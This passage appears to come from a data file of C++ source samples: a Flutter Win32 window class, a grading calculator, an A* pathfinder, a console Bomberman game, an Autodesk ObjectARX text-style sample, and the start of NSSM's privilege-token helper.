GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n//#include <conio.h>\n#include <iomanip>\n#include <string>\n\nusing namespace std;\n\nfloat quizCalculator(int examQuant, float stuScore){\n    float finalScore;\n\n    finalScore = (stuScore / examQuant) * 100;\n    return finalScore;\n}\n\nfloat midtermCalculator(float cStanding, float mScore){\n    float cCS_Final;\n    float cME_Final;\n    float mExamAv;\n\n    cCS_Final = (60 * cStanding) / 100;\n    cME_Final = (40 * mScore) / 100;\n\n    mExamAv = cCS_Final + cME_Final;\n    return mExamAv;\n}\n\nfloat finalsCalculator(float fStanding, float fME, float fScore){\n    float fCS_Final;\n    float fME_Final;\n    float fFE_Final;\n    float fExamAv;\n\n    fCS_Final = (60 * fStanding) / 100;\n    fME_Final = (15 * fME) / 100;\n    fFE_Final = (25 * fScore) / 100;\n\n    fExamAv = fCS_Final + fME_Final + fFE_Final;\n    return fExamAv;\n}\n\nint main(){\n\n    string studentName;\n    float q_grade, m_grade, f_grade, gradePoint;\n    char pref;\n    char op;\n\n    // For Q\n    string qName;\n    int quantity;\n    float q_Score;\n\n    // For M\n    string mSubject;\n    float classStanding;\n    float mExamScore;\n\n    // For F\n    string fSubject;\n    float fClassStanding;\n    float fMScore;\n    float finalsScore;\n\n    // For G\n    string desc;\n    float scoreRaw;\n\n    // Startup Intro\n    cout<<\"X==================================X\"<<endl;\n    cout<<\"X            Welcome to            X\"<<endl;\n    cout<<\"X    Grading Calculator System     X\"<<endl;\n    cout<<\"X==================================X\"<<endl;\n    cout<<\"XxX Created by BMA-AM12 Students XxX\"<<endl;\n    cout<<endl<<endl;\n\n    // Do-while\n\n    do{\n        // Execute options\n        cout<<\"XX XX XX Please choose any options you would like to use: XX XX XX\"<<endl;\n        cout<<endl<<endl;\n        // Options initiated\n        cout<<\"XX:: [Q] Calculate Quiz/Exam Grade\"<<endl;\n        cout<<\"XX:: [M] Calculate Midterms Grade\"<<endl;\n        cout<<\"XX:: [F] Calculate Finals Grade\"<<endl;\n        cout<<\"XX:: [G] Check possible grade if...\"<<endl;\n        cout<<\"XX:: [X] Exit Program\\n\\n\";\n        cout<<\"[XX Your option XX] = >    \";\n\n        cin>>op;\n\n        // Option choice\n        switch (op) {\n            case 'Q':\n            case 'q':\n\n                cout<<\"[ YOUR OPTION IS Q ]\"<<endl;\n                cout<<endl;\n                cout<<\"[XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX]\\n\\n\";\n                cout<<\"XX: Enter student name: \";\n                cin>>studentName; /*Put data on studentName string*/\n                cout<<\"XX: Enter quiz/exam name: \";\n                cin>>qName;\n                cout<<\"XX: Enter quiz/exam's quantity/question amount: \";\n                cin>>quantity;\n                cout<<\"XX: Enter the examinee's answers written correctly (scores): \";\n                cin>>q_Score;\n\n                q_grade = quizCalculator(quantity, q_Score);\n                cout<<fixed<<setprecision(2);\n                cout<<\"\\n\\nYour student \"<<studentName<<\" got a score of \"<<q_grade<<\" percent on your quiz/exam \"<<qName<<\".\\n\\n\";\n                cout<<\"[XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX]\\n\\n\"<<endl;\n\n                break;\n\n            case 'M':\n            case 'm':\n                cout<<\"[ YOUR OPTION IS M ]\"<<endl;\n                cout<<endl;\n                cout<<\"[XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX]\\n\\n\";\n                cout<<\"XX: Enter student name: \";\n                cin>>studentName; /*Put data on studentName string*/\n                cout<<\"XX: Enter subject: \";\n                cin>>mSubject;\n                cout<<\"XX: Enter your student's class standing (in percentage)\\nFor reference, 60 percent is the contribution of class standing: \";\n                cin>>classStanding;\n                cout<<\"XX: Enter the student's midterm examination grade (in percentage)\\n(For reference, 40 percent is the contribution of midterm exam): \";\n                cin>>mExamScore;\n\n                if (classStanding > 100 || mExamScore > 100) {\n                    cout<<\"\\nXX: ERROR ! ERROR ! ERROR !\\nXX: Overall average is higher than expected!\\nXX: Please try again. Exiting option...\\n\";\n                } else {\n                    m_grade = midtermCalculator(classStanding, mExamScore);\n\n                    if (m_grade <= 79) {\n                        gradePoint = 0.5;\n                    } else if (m_grade >= 100) {\n                        gradePoint = 4.0;\n                        desc = \"Bruh\";\n                    } else if (m_grade >= 97) {\n                        gradePoint = 4.0;\n                        desc = \"Excellent\";\n                    } else if (m_grade >= 93) {\n                        gradePoint = 3.5;\n                        desc = \"Superior\";\n                    } else if (m_grade >= 89) {\n                        gradePoint = 3.0;\n                        desc = \"Very Good\";\n                    } else if (m_grade >= 85) {\n                        gradePoint = 2.5;\n                        desc = \"Good\";\n                    } else if (m_grade >= 80) {\n                        gradePoi",
    "#include <iostream>\n#include <vector>\n#include <queue>\n#include <cmath>\nusing namespace std;\n\nstruct Node {\n    int x, y;\n    int g, h;\n    Node* parent;\n\n    Node(int x, int y, int g, int h, Node* parent) : x(x), y(y), g(g), h(h), parent(parent) {}\n\n    int f() const {\n        return g + h;\n    }\n};\n\nvector<Node*> findPath(const vector<vector<int>>& grid, const pair<int, int>& start, const pair<int, int>& end) {\n    int dx[4] = {1, -1, 0, 0};\n    int dy[4] = {0, 0, 1, -1};\n\n    int rows = grid.size();\n    int cols = grid[0].size();\n\n    auto isValid = [&](int x, int y) {\n        return x >= 0 && x < rows && y >= 0 && y < cols && grid[x][y] == 0;\n    };\n\n    auto manhattanDistance = [&](int x1, int y1, int x2, int y2) {\n        return abs(x2 - x1) + abs(y2 - y1);\n    };\n\n    vector<vector<bool>> visited(rows, vector<bool>(cols, false));\n    priority_queue<pair<int, Node*>, vector<pair<int, Node*>>, greater<pair<int, Node*>>> pq;\n    pq.push({0, new Node(start.first, start.second, 0, manhattanDistance(start.first, start.second, end.first, end.second), nullptr)});\n\n    while (!pq.empty()) {\n        auto [priority, current] = pq.top();\n        pq.pop();\n\n        if (current->x == end.first && current->y == end.second) {\n            vector<Node*> path;\n            while (current != nullptr) {\n                path.push_back(current);\n                current = current->parent;\n            }\n            return path;\n        }\n\n        if (visited[current->x][current->y]) continue;\n        visited[current->x][current->y] = true;\n\n        for (int i = 0; i < 4; ++i) {\n            int nx = current->x + dx[i];\n            int ny = current->y + dy[i];\n\n            if (isValid(nx, ny) && !visited[nx][ny]) {\n                pq.push({current->g + 1 + manhattanDistance(nx, ny, end.first, end.second),\n                         new Node(nx, ny, current->g + 1, manhattanDistance(nx, ny, end.first, end.second), current)});\n            }\n        }\n    }\n\n    return {};\n}\n\nint main() {\n    vector<vector<int>> grid = {\n    {0, 0, 0, 0, 0, 0, 0, 1, 1, 0},\n    {0, 1, 1, 1, 1, 1, 0, 1, 1, 0},\n    {0, 1, 1, 1, 1, 1, 0, 1, 1, 0},\n    {0, 1, 0, 0, 0, 0, 0, 0, 1, 0},\n    {0, 1, 0, 1, 1, 1, 1, 0, 0, 0},\n    {0, 1, 0, 1, 1, 1, 1, 0, 1, 0},\n    {0, 1, 0, 1, 1, 1, 1, 0, 1, 0},\n    {0, 1, 0, 1, 1, 1, 1, 0, 1, 0},\n    {1, 1, 0, 0, 0, 0, 0, 0, 1, 0},\n    {1, 1, 1, 1, 1, 1, 1, 1, 1, 0},\n    {1, 1, 1, 1, 1, 1, 1, 1, 1, 0},\n    {0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n    {0, 1, 1, 1, 1, 1, 1, 1, 1, 1},\n    {0, 1, 1, 1, 1, 1, 1, 1, 1, 0},\n    {0, 1, 1, 1, 1, 1, 1, 1, 1, 0},\n    {0, 0, 0, 0, 0, 0, 0, 0, 1, 0},\n    {0, 1, 0, 1, 1, 1, 1, 0, 1, 0},\n    {0, 1, 0, 1, 1, 1, 1, 0, 1, 0},\n    {0, 1, 0, 1, 1, 1, 1, 0, 1, 0},\n    {0, 1, 0, 1, 1, 1, 1, 0, 1, 0}\n};\n\n    pair<int, int> start = {0, 0};\n    pair<int, int> end = {19, 7};\n\n    auto path = findPath(grid, start, end);\n\n    if (!path.empty()) {\n        cout << \"Caminho encontrado:\" << endl;\n        for (int i = path.size() - 1; i >= 0; --i) {\n            cout << \"(\" << path[i]->x << \", \" << path[i]->y << \")\" << endl;\n        }\n    } else {\n        cout << \"Nenhum caminho encontrado.\" << endl;\n    }\n\n    return 0;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\r\n#include <ctime>\r\n#include <time.h> \r\n#include <Windows.h>\r\n#include <conio.h> \r\nusing namespace std;\r\n\r\nenum MazeObject { HALL = 0, WALL = 1, WALLTWO = 2, WALLTHREE = 3, ENEMY = 4, BOMB = 5, HEALTH = 6 };\r\nenum Color { DARKGREEN = 2, YELLOW = 14, RED = 12, BLUE = 9, WHITE = 15, DARKYELLOW = 6, DARKRED = 4, PURPUR = 13, GREEN = 10 };\r\nenum KeyCode { ENTER = 13, ESCAPE = 27, SPACE = 32, LEFT = 75, RIGHT = 77, UP = 72, DOWN = 80 };\r\n\r\nclass Menu;\r\nclass Bomb;\r\nclass Maze;\r\nclass Application;\r\nclass Enemy;\r\nclass Bomber;\r\nclass MazeObj;\r\nclass Wall;\r\nclass Game;\r\n\r\n\r\nclass Menu {\r\n    const int NUM_MENU_ITEMS = 3;\r\n    int ActiveMenuItem = 0; // \u0412\u044b\u0431\u0440\u0430\u043d\u043d\u044b\u0439 \u043f\u0443\u043d\u043a\u0442 \u043c\u0435\u043d\u044e\r\n    int ch = 0; // \u0425\u0440\u0430\u043d\u0435\u043d\u0438\u0435 \u043d\u0430\u0436\u0430\u0442\u043e\u0439 \u043a\u043b\u0430\u0432\u0438\u0448\u0438\r\n    bool exit = false; // \u0434\u043b\u044f \u0432\u044b\u0445\u043e\u0434\u0430 \u0438\u0437 \u0446\u0438\u043a\u043b\u0430\r\n\r\npublic:\r\n    void gotoxy(int x, int y) {\r\n        COORD coord;\r\n        coord.X = x;\r\n        coord.Y = y;\r\n        SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), coord);\r\n    }\r\n\r\n    // \u0421\u0430\u043c\u043e \u043c\u0435\u043d\u044e \u043e\u0441\u043d\u043e\u0432\u0430\r\n    void Menushka() {\r\n\r\n        system(\"color F0\");\r\n        system(\"cls\");\r\n\r\n        while (!exit) {\r\n            ShowMenu();\r\n            gotoxy(0, ActiveMenuItem);\r\n\r\n            ch = _getch();\r\n            if (ch == 224)\r\n                ch = _getch();\r\n\r\n            switch (ch) {\r\n            case 27: // \u0421\u0442\u0440\u0435\u043b\u043a\u0430 \u0432\u0432\u0435\u0440\u0445\r\n                exit = true;\r\n                break;\r\n            case 72: // \u0421\u0442\u0440\u0435\u043b\u043a\u0430 \u0432\u0432\u0435\u0440\u0445\r\n                ActiveMenuItem = (ActiveMenuItem - 1 + NUM_MENU_ITEMS) % NUM_MENU_ITEMS;\r\n                break;\r\n            case 80: //\u0421\u0442\u0440\u0435\u043b\u043a\u0430 \u0432\u043d\u0438\u0437\r\n                ActiveMenuItem = (ActiveMenuItem + 1) % NUM_MENU_ITEMS;\r\n                break;\r\n            case 13: // \u041a\u043b\u0430\u0432\u0438\u0448\u0430 \u042d\u043d\u0442\u0435\u0440\r\n                if (ActiveMenuItem == 0) {\r\n                    system(\"cls\"); // !!!!!!!!!!!!!!!!!!!\r\n                    cout << \"NEW GAME\\n\";\r\n                    Sleep(1000);\r\n                    return;\r\n                }\r\n                else if (ActiveMenuItem == 1) { // \u041e\u0431 \u0430\u0432\u0442\u043e\u0440\u0435 \u043a\u043d\u043e\u043f\u043a\u0430\r\n                    AboutAuthors();\r\n                }\r\n                else if (ActiveMenuItem == 2) { // \u041a\u043d\u043e\u043f\u043a\u0430 \u0432\u044b\u0445\u043e\u0434 \u0438\u0437 \u0438\u0433\u0440\u044b\r\n                    ::exit(0);\r\n                }\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n    // \u0412\u044b\u0432\u043e\u0434 \u043b\u043e\u0433\u043e\r\n    void ShowLogo() {\r\n        gotoxy(50, 15);\r\n        cout << \"BOMBERMAN!!!\" << \"\\n\";\r\n        Sleep(1000);\r\n    }\r\n\r\n    // \u0412\u044b\u0432\u043e\u0434 \u043c\u0435\u043d\u044e\r\n    void ShowMenu() {\r\n        system(\"cls\");\r\n        cout << \"Start game\" << \"\\n\";\r\n        cout << \"About authors\" << \"\\n\";\r\n        cout << \"Exit\" << \"\\n\";\r\n    }\r\n\r\n    // \u041f\u0440\u043e \u043d\u0430\u0441\r\n    void AboutAuthors() {\r\n        system(\"cls\");\r\n        cout << \"Bienoieva Malika\" << \"\\n\" << \"Lolo Mukhammed\\n\\n\\n\\n\";\r\n        system(\"pause\");\r\n    }\r\n};\r\n\r\n\r\n\r\nclass Maze {\r\nprivate:\r\n    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);\r\n    int width;\r\n    int height;\r\n    int** bomber = nullptr;\r\npublic:\r\n\r\n    Maze() {\r\n        SetWidth(61);\r\n        SetHeight(17);\r\n    }\r\n\r\n    Maze(const Maze& original) {\r\n        width = original.width;\r\n        height = original.height;\r\n\r\n        bomber = new int* [height];\r\n        for (int i = 0; i < height; i++) {\r\n            bomber[i] = new int[width];\r\n        }\r\n\r\n        for (int y = 0; y < height; y++) {\r\n            for (int x = 0; x < width; x++) {\r\n                bomber[y][x] = original.bomber[y][x];\r\n            }\r\n        }\r\n    }\r\n\r\n    HANDLE GetH() {\r\n        return h;\r\n    }\r\n\r\n    Maze(int w, int h) : width(w), height(h) {\r\n        bomber = new int* [height];\r\n        for (int i = 0; i < height; i++) {\r\n            bomber[i] = new int[width];\r\n        }\r\n        Generation();//\u043c\u0435\u0442\u043e\u0434 \u043d\u0430\u0445\u043e\u0434\u0438\u0442\u0441\u044f \u0432 \u041a\u0421\u041f \u0434\u043b\u044f \u0442\u043e\u0433\u043e \u0447\u0442\u043e\u0431 \u0433\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f \u0431\u044b\u043b\u0430 \u0434\u043e\u0441\u0442\u0443\u043f\u043d\u0430 \u0434\u043b\u044f \u0432\u0441\u0435\u0445 \u043c\u043a\u0442\u043e\u0434\u043e\u0432 \u043a\u043b\u0430\u0441\u0441\u0430\r\n    }\r\n\r\n    void Generation() {//\u0441\u0434\u0435\u043b\u0430\u043b \u0433\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044e \u0434\u043b\u044f \u043c\u0430\u0441\u0441\u0438\u0432\u0430 bomber\r\n        for (int y = 0; y < height; y++) {\r\n            for (int x = 0; x < width; x++) {\r\n                bomber[y][x] = rand() % 7;\r\n            }\r\n        }\r\n    }\r\n\r\n    int** GetBomber() const {\r\n        return bomber;\r\n    }\r\n\r\n    void SetCursor(int x, int y, int color) {\r\n        COORD position;\r\n        position.X = x;\r\n        position.Y = y;\r\n        SetConsoleCursorPosition(h, position);\r\n        SetConsoleTextAttribute(h, color);\r\n    }\r\n\r\n    void SetWidth(int width) {\r\n        this->width = width;\r\n    }\r\n\r\n    int GetWidth() {\r\n        return width;\r\n    }\r\n\r\n    void SetHeight(int height) {\r\n        this->height = height;\r\n    }\r\n\r\n    int GetHeight() {\r\n        return height;\r\n    }\r\n\r\n    void KeyBoard(int x, int y) {\r\n        COORD position;\r\n        position.X = x;\r\n        position.Y = y;\r\n    }\r\n\r\n    void FreeMemory() {\r\n        for (int y = 0; y < height; y++) {\r\n            delete[] bomber[y];\r\n        }\r\n        delete[] bomber;\r\n    }\r\n\r\n    void Options() {\r\n        HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);\r\n        // \u0440\u0430\u0437\u043c\u0435\u0440 \u043e\u043a\u043d\u0430 - 130\u044550 \u0441\u0438\u043c\u0432\u043e\u043b\u043e\u0432\r\n        CONSOLE_CURSOR_INFO ci; // \u0441\u043a\u0440\u044b\u0442\u0438\u0435 \u043a\u0443\u0440\u0441\u043e\u0440\u0430\r\n        ci.bVisible = false; // \u043a\u0443\u0440\u0441\u043e\u0440 \u043d\u0435 \u0432\u0438\u0434\u043d",
    "//////////////////////////////////////////////////////////////////////////////\n//\n//  Copyright 2023 Autodesk, Inc.  All rights reserved.\n//\n//  Use of this software is subject to the terms of the Autodesk license \n//  agreement provided at the time of installation or download, or which \n//  otherwise accompanies this software in either electronic or hard copy form.   \n//\n//////////////////////////////////////////////////////////////////////////////\n//\n// stylcvrt.cpp\n//\n\n#if defined(_DEBUG) && !defined(AC_FULL_DEBUG)\n#error _DEBUG should not be defined except in internal Adesk debug builds\n#endif\n\n#include <string.h>\n#include <stdio.h>\n#include \"aced.h\"\n#include \"dbsymtb.h\"\n#include \"dbapserv.h\"\n#include \"acgi.h\"\n#include \"tchar.h\"\n#include \"Ac64BitHelpers.h\"\n\n\n\n// globals\n//\nstatic AcGiTextStyle AsdkStyle;\n\n\nclass AsdkTxtStyleSamp: public AcDbEntity\n{\npublic:\n\n    ACRX_DECLARE_MEMBERS(AsdkTxtStyleSamp);\nprotected:\n    virtual Adesk::Boolean subWorldDraw(AcGiWorldDraw *);\n    Acad::ErrorStatus subTransformBy(const AcGeMatrix3d &);\n};\n\n\nACRX_DXF_DEFINE_MEMBERS(AsdkTxtStyleSamp,AcDbEntity,\nAcDb::kDHL_CURRENT, AcDb::kMReleaseCurrent, 0,\\\n    AsdkTxtStyleSamp,AsdkTextStyle Sample);\n\nAcad::ErrorStatus AsdkTxtStyleSamp::subTransformBy(\n    const AcGeMatrix3d &xfm)\n{\n    return Acad::eOk;\n}\n \n\nAdesk::Boolean\nAsdkTxtStyleSamp::subWorldDraw(AcGiWorldDraw* pW)\n{\n    AcGePoint3d pos(0.0, 0.0, 0.0);\n    AcGeVector3d norm(0.0, 0.0, 1.0);\n    AcGeVector3d dir(1.0, 0.2, 0.0);\n    TCHAR *pStr = _T(\"Test string\");\n    int len = _tcslen(pStr);\n    \n    pW->geometry().text(pos, norm, dir, pStr, len,\n        Adesk::kFalse, AsdkStyle);\n\n    return Adesk::kTrue;\n}\n\n\n// THE FOLLOWING CODE APPEARS IN THE SDK DOCUMENT.\n\n// Get an AcGiTextStyle from an acDbTextStyleTableRecord.\n// Try to map as many characteristics as possible.\n//\nvoid\ngetTextStyle(AcGiTextStyle& newStyle, AcDbObjectId styleId)\n{\n    AcDbTextStyleTableRecord *pOldStyle;\n    acdbOpenObject(pOldStyle, styleId,\n        AcDb::kForRead);\n    const TCHAR *pTmpStr;\n    pOldStyle->fileName(pTmpStr);\n    newStyle.setFileName(pTmpStr);\n\n    pOldStyle->bigFontFileName(pTmpStr);\n    newStyle.setBigFontFileName(pTmpStr);\n\n    newStyle.setTextSize(pOldStyle->textSize());\n    newStyle.setXScale(pOldStyle->xScale());\n    newStyle.setObliquingAngle(pOldStyle->obliquingAngle());\n\n    pOldStyle->close();\n    newStyle.loadStyleRec();\n}\n\n// END CODE APPEARING IN SDK DOCUMENT.\n\nvoid\naddAsdkTxtStyleSampObject()\n{\n    // First set up the styleId global with a valid\n    // ObjectId for an AcDbTextStyleTableRecord.\n    //\n    AcDbTextStyleTable *pStyleTable;\n    acdbHostApplicationServices()->workingDatabase()\n        ->getSymbolTable(pStyleTable, AcDb::kForRead);\n   \n    AcDbTextStyleTableIterator *pIterator;\n    pStyleTable->newIterator(pIterator);\n\n    // get ObjectId of first record in table\n    //\n    AcDbObjectId styleId;\n    pIterator->getRecordId(styleId);\n\n    delete pIterator;\n    pStyleTable->close();\n    \n    // convert the AcDbTextStyleTableRecord to an\n    // AcGiTextStyle using the global AsdkStyle\n    // AcGiTextStyle object as the recipient.\n    //\n    getTextStyle(AsdkStyle, styleId);\n\n\n    // Ok,  now make one of our AsdkTxtStyleSamp entities\n    // and add it to Model Space.\n    \n    AsdkTxtStyleSamp *pNewObj = new AsdkTxtStyleSamp;\n\n    AcDbBlockTable *pBlockTable;\n    acdbHostApplicationServices()->workingDatabase()\n        ->getSymbolTable(pBlockTable, AcDb::kForRead);\n\n    AcDbBlockTableRecord *pBlock;\n    pBlockTable->getAt(ACDB_MODEL_SPACE, pBlock,\n        AcDb::kForWrite);\n\n    AcDbObjectId objId;\n    pBlock->appendAcDbEntity(objId, pNewObj);\n\n    pBlockTable->close();\n    pBlock->close();\n    pNewObj->close();\n}\n\nstatic void initAsdkTxtStyleSamp()\n{\n    AsdkTxtStyleSamp::rxInit();\n    acrxBuildClassHierarchy();\n\n    acedRegCmds->addCommand(_T(\"ASDK_STYLE_CONVERT_SAMP\"),\n                            _T(\"ASDKSTYLECVRT\"),\n                            _T(\"STYLECVRT\"),\n                            ACRX_CMD_TRANSPARENT,\n                            addAsdkTxtStyleSampObject);\n}\n\nextern \"C\" AcRx::AppRetCode\nacrxEntryPoint(AcRx::AppMsgCode msg, void* appId) \n{\n    switch(msg) {\n    case AcRx::kInitAppMsg:\n        acrxDynamicLinker->unlockApplication(appId);\n        acrxDynamicLinker->registerAppMDIAware(appId);\n        initAsdkTxtStyleSamp();\n        break;\n    case AcRx::kUnloadAppMsg:\n        acedRegCmds->removeGroup(_T(\"ASDK_STYLE_CONVERT_SAMP\"));\n            deleteAcRxClass(AsdkTxtStyleSamp::desc());\n    }\n    return AcRx::kRetOK;\n}\n",
    "#include \"nssm.h\"\r\n\r\nextern imports_t imports;\r\n\r\nHANDLE get_debug_token() {\r\n  long error;\r\n  HANDLE token;\r\n  if (! OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, false, &token)) {\r\n    error = GetLastError();\r\n    if (error == ERROR_NO_TOKEN) {\r\n      (void) ImpersonateSelf(SecurityImpersonation);\r\n      (void) OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, false, &token);\r\n    }\r\n  }\r\n  if (! token) return INVALID_HANDLE_VALUE;\r\n\r\n  TOKEN_PRIVILEGES privileges, old;\r\n  unsigned long size = sizeof(TOKEN_PRIVILEGES);\r\n  LUID luid;\r\n  if (! LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {\r\n    CloseHandle(token);\r\n    return INVALID_HANDLE_VALUE;\r\n  }\r\n\r\n  privileges.PrivilegeCount = 1;\r\n  privileges.Privileges[0].Luid = luid;\r\n  privileges.Privileges[0].Attributes = 0;\r\n\r\n  if (! AdjustTokenPrivileges(token, false, &privileges, size, &old, &size)) {\r\n    CloseHandle(token);\r\n    return INVALID_HANDLE_VALUE;\r\n  }\r\n\r\n  old.PrivilegeCount = 1;\r\n  old.Privileges[0].Luid = luid;\r\n  